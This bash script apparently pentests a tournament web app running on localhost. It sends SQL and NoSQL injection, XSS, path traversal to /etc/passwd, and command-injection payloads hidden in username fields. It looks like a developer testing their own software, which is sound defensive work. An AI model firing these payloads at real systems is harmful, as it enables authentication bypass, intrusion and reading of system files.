#!/bin/bash
echo "=== TESTING EXISTING ENDPOINTS ==="

# Login
echo "1️⃣ Logging in..."
curl -k -s -X POST https://localhost:8443/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test222@test.com","password":"Test123!"}' \
  -c cookies.txt > /dev/null

echo ""
echo "2️⃣ SQL Injection in Tournament Creation (if endpoint exists)..."
curl -k -X POST https://localhost:8443/api/tournaments \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"name":"Tourney'\'' OR '\''1'\''='\''1","maxPlayers":4}' \
  -w "\nHTTP: %{http_code}\n"

echo ""
echo "3️⃣ XSS in Tournament Name..."
curl -k -X POST https://localhost:8443/api/tournaments \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"name":"<script>alert(\"XSS\")</script>","maxPlayers":4}' \
  -w "\nHTTP: %{http_code}\n"

echo ""
echo "4️⃣ Path Traversal in Stats..."
curl -k -s "https://localhost:8443/api/stats?file=../../../etc/passwd" \
  -b cookies.txt | jq .

echo ""
echo "5️⃣ SQL Injection in Registration (wieder testen)..."
curl -k -X POST https://localhost:8443/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker'\''--","email":"hack2@test.com","password":"Test123!"}' \
  -w "\nHTTP: %{http_code}\n"

echo ""
echo "6️⃣ Command Injection in Username..."
curl -k -X POST https://localhost:8443/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test; cat /etc/passwd","email":"hack3@test.com","password":"Test123!"}' \
  -w "\nHTTP: %{http_code}\n"

echo ""
echo "7️⃣ NoSQL Injection in Login..."
curl -k -X POST https://localhost:8443/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":""},"password":{"$ne":""}}' \
  -w "\nHTTP: %{http_code}\n"

echo ""
echo "8️⃣ Liste alle Tournaments (prüfe auf Daten-Leaks)..."
curl -k -s https://localhost:8443/api/tournaments -b cookies.txt | jq .

